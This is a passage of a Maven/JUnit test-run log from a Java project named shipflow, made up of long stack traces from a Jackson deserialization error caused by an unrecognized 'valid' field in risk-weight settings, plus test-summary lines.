	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:52.526Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.getSettings(OrganizationSettingsService.java:39) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$DefaultSettingsCreationTests.defaultSettingsShouldHaveCorrectRiskThresholds(OrganizationSettingsServiceTest.java:474) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.199 s -- in com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$DefaultSettingsCreationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$ResetToDefaultsTests
2026-01-17T23:26:52.530Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings reset to defaults by admin
2026-01-17T23:26:52.530Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.resetToDefaults(OrganizationSettingsService.java:117) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$ResetToDefaultsTests.shouldCreateDefaultPitchCategoriesOnReset(OrganizationSettingsServiceTest.java:428) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
